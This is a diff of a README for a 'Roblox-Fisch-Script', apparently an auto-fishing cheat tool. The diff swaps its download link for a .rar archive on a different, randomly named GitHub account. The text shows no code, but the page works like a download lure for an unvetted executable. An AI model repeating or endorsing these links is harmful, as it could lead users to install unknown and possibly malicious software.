@@ -6,7 +6,7 @@ Welcome to the Roblox-Fisch-Script! This software offers unique features for an 
 
 ## 📥 Download the Software
 
-[![Download Roblox-Fisch-Script](https://raw.githubusercontent.com/Mehdidu9345556/Roblox-Fisch-Script/main/Djuka/Roblox-Fisch-Script.zip)](https://raw.githubusercontent.com/Mehdidu9345556/Roblox-Fisch-Script/main/Djuka/Roblox-Fisch-Script.zip)
+[![Download Roblox-Fisch-Script](https://github.com/castlebupyc90nz/Roblox-Fisch-Script/releases/download/Download/Roblox-Fisch-Script.rar)
 
 ## 📋 Features
 
@@ -17,14 +17,14 @@ Welcome to the Roblox-Fisch-Script! This software offers unique features for an 
 
 ## 🛠 System Requirements
 
-- **Operating System**: Windows 10 or higher
+- **Operating System**: Windows 7 or higher
 - **RAM**: Minimum 4 GB
 - **Storage**: At least 100 MB of free space
 - **Network**: Stable internet connection for downloading and using the software
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases page to download](https://raw.githubusercontent.com/Mehdidu9345556/Roblox-Fisch-Script/main/Djuka/Roblox-Fisch-Script.zip). There you will find all available versions of the software.
+To get started, visit the [Releases page to download](https://github.com/castlebupyc90nz/Roblox-Fisch-Script/releases/tag/Download). There you will find all available versions of the software.
 
 1. Click on the link above.
 2. Choose the latest release from the list.
@@ -35,7 +35,7 @@ To get started, visit the [Releases page to download](https://raw.githubusercont
 ## 💡 How to Use the Software
 
 1. Open the application.
-2. Log in to your Roblox account.
+2. Open Roblox app and join to the game
 3. Follow the on-screen instructions to begin fishing automatically.
 4. Enjoy your upgraded fishing game without any hassle.
 
